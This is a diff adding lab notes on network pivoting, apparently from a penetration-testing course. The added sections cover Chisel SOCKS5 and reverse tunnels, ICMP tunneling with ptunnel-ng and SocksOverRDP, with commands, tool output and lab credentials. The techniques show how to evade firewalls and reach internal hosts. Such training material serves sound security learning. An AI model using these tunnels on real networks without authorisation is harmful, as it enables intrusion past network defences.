@@ -449,7 +449,7 @@ for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 
 Our ping sweeps may get stopped by the host's firewall.  Specifcally the replies. We can use Metasploit's `socks_proxy` to confiugre a local proxy on our attack host.
 
-### Confiugre MSF's SOCKS Proxy
+### Configure MSF's SOCKS Proxy
 ```shell-session
 msf6 > use auxiliary/server/socks_proxy
 
@@ -525,11 +525,11 @@ Or we can do this in the Meterpreter session.
 
 ```shell-session
 meterpreter > run autoroute -s 172.16.5.0/23
-
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
 [!] Example: run post/multi/manage/autoroute OPTION=value [...]
 [*] Adding a route to 172.16.5.0/255.255.254.0...
-[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+
 [*] Use the -p option to list all active routes
 ```
 
@@ -914,3 +914,227 @@ Session 1 Security: ENCRYPTED AND VERIFIED!
 
 dnscat2>
 ```
+
+# Socks 5 Tunneling with Chisel
+
+[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
+
+You need chisel and go on the attack host.
+```
+$ git clone https://github.com/jpillora/chisel.git
+$ cd chisel
+$ go build
+```
+
+Use scp to copy to the pivot host:
+
+## Transfer Chisel BInary to Pivot Host
+```
+scp chisel ubuntu@<IP>:~/
+
+ubuntu@10.129.202.64's password: 
+chisel                                        100%   11MB   1.2MB/s   00:09
+```
+
+## Run the Chisel Server on the Pivot Host
+
+```
+ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+
+2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+2022/05/05 18:16:25 server: Listening on http://0.0.0.0:12
+```
+
+This listener will listen for incoming connections on port 1234 and then forward it to all the networks that are accessible from the pivot host. Now start the chisel client on the attack host and connect to the Chisel server.
+
+## Connect to the Chisel Server
+
+```shell-session
+$ ./chisel client -v 10.129.202.64:1234 socks
+
+2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/05/05 14:21:18 client: tun: Bound proxies
+2022/05/05 14:21:19 client: Handshaking...
+2022/05/05 14:21:19 client: Sending config
+2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+2022/05/05 14:21:19 client: tun: SSH connected
+```
+
+Note, the proxy port at 127.0.0.1:1080.
+
+### Check proxychains.conf
+
+```shell-session
+$ tail -f /etc/proxychains.conf 
+
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4 	127.0.0.1 9050
+socks5 127.0.0.1 1080
+```
+
+Now we can pivot:
+
+```
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+
+## Chisel Reverse Pivot
+
+There are times when the firewall rules prohibit inbound connections. We just have to setup chisel as a reverse server.
+
+## Start Chisel on our Attack Host
+
+```shell-session
+$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+```
+
+Connect to the pivot host using the option R:socks
+
+```shell-session
+$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+```
+
+Check proxychains as above then pivot using proxychains, as above.
+
+# ICMP Tunneling with SOCKS
+
+ICMP tunneling encapsulates traffic withn ICMP packets containing echo requests and repsponses.  This works when ping responses are permitted within a firwalled network.
+
+We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.
+
+## Setup and ptunnel-ng
+
+```
+$ git clone https://github.com/utoni/ptunnel-ng.gt
+$ cd ptunnel-ng
+$ sudo ./autogen.sh
+```
+
+## Copy to Pivot host
+
+```shell-session
+$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+```
+
+## Start the ptunnel-ng Server on the Pivot host
+
+```shell-session
+ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+
+[sudo] password for ubuntu: 
+./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Forwarding incoming ping packets over TCP.
+[inf]: Ping proxy is listening in privileged mode.
+[inf]: Dropping privileges now.
+```
+
+## Connect to ptunnel-ng from Attack Host
+
+```shell-session
+$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Relaying packets from incoming TCP streams.
+```
+
+## Tunneling an SSH connection through an ICMP Tunnel
+
+```shell-session
+$ ssh -p2222 -lubuntu 127.0.0.1
+```
+
+## Enabling Dynamic Port Forwarding over SSH
+
+```shell-session
+$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+ubuntu@127.0.0.1's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+<snip>
+```
+
+## Proxychaining through the ICMP tunnel
+```shell-session
+$ proxychains nmap -sV -sT 172.16.5.19 -p3389
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+Nmap scan report for 172.16.5.19
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
+```
+
+# RDP and SOCKS Tunneling with SocksOverRDP
+
+If we can't use SSH because we're limited to Windows, [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.
+
+We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:
+
+1.  [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
+    
+2.  [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+    
+
+-   We can look for `ProxifierPE.zip`
+
+We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
+
+#### Loading SocksOverRDP.dll using regsvr32.exe
+
+```cmd-session
+C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.
+
+We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
+
+```cmd-session
+C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
+
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+```
+
+
+After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.
+
+With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.
+
+#### RDP Performance Considerations
+
+When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the `Experience` tab in mstsc.exe and set `Performance` to `Modem`.
+
